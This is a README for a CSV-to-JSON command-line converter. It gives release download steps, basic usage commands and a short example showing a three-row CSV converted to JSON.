# 🛠️ csv-to-json - Convert CSV Data to JSON Effortlessly

## 🔗 Download the Latest Version
[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/OuadieEl/csv-to-json/releases)

## 🚀 Getting Started
Welcome to the csv-to-json project! This tool helps you convert CSV files into JSON format easily. It works on any system, so you can use it on Windows, macOS, or Linux. No programming knowledge is needed to use this application.

### ⚙️ What You Need
- A computer with any operating system (Windows, macOS, or Linux).
- A CSV file you want to convert.

### 📥 Download & Install
To get started, visit this page to download: [Releases Page](https://github.com/OuadieEl/csv-to-json/releases).

1. **Go to the Releases Page:** Click the link above to access the latest versions of the software.
   
2. **Find Your Version:** Look through the list of releases and choose the latest one.

3. **Download the File:** Click on the appropriate file for your operating system. For example, download the `.exe` file for Windows or the `.tar.gz` file for macOS/Linux.

4. **Install the Tool:** 
   - For Windows, double-click the downloaded `.exe` file and follow the instructions.
   - For macOS and Linux, extract the `.tar.gz` file and place the executable in a location you prefer.

### 🖥️ Using csv-to-json
Once you have installed the tool, you can easily convert your CSV files to JSON. Here’s how:

1. **Open your Command Line Interface:** 
   - On Windows, you can use Command Prompt or PowerShell.
   - On macOS, use Terminal.
   - On Linux, open your preferred terminal.

2. **Navigate to Your CSV File:**
   Use the `cd` command to go to the folder where your CSV file is located. 
   ```bash
   cd path/to/your/csvfile
   ```

3. **Run the Conversion Command:**
   Use the following command to convert your file:
   ```bash
   csv-to-json yourfile.csv > outputfile.json
   ```
   Replace `yourfile.csv` with the name of your CSV file.

4. **Check the Output:**
   After running the command, you will find a new file named `outputfile.json` in the same folder.

### 📂 Features
- **Cross-Platform:** Works on Windows, macOS, and Linux.
- **Simple Command-Line Interface:** Easy to use without any prior experience.
- **Fast Conversion:** Quickly converts large CSV files to JSON format.

### 🛡️ System Requirements
- At least 100 MB of free space on your hard drive.
- No additional software is needed to run the tool.

### 📑 Examples
Here are a couple of examples to help you understand how to use the tool effectively.

1. **Example CSV File:**
   If you have a CSV file named `data.csv` that contains:
   ```
   Name, Age, City
   John Doe, 30, New York
   Jane Smith, 25, Los Angeles
   ```

   Running the command:
   ```bash
   csv-to-json data.csv > data.json
   ```
   Will create a `data.json` file that looks like:
   ```json
   [
     {"Name":"John Doe","Age":30,"City":"New York"},
     {"Name":"Jane Smith","Age":25,"City":"Los Angeles"}
   ]
   ```

2. **Saving to a Different File Name:**
   You can also specify a different output file name:
   ```bash
   csv-to-json data.csv > mydata.json
   ```
   This will create a file named `mydata.json`.

### 🤔 Troubleshooting
If you encounter any issues, please consider the following:
- Ensure that your CSV file is properly formatted. Each row should have the same number of columns.
- Make sure you are in the correct directory when running the commands.

### 📞 Support
For additional help or questions, please raise an issue on the [GitHub Issues Page](https://github.com/OuadieEl/csv-to-json/issues). We are here to assist you.

### 🔗 Additional Resources
- [Official Go Documentation](https://golang.org/doc/)
- [CSV File Format Overview](https://en.wikipedia.org/wiki/Comma-separated_values)

Thank you for using csv-to-json! We hope this tool makes it easy for you to convert your CSV data into JSON format.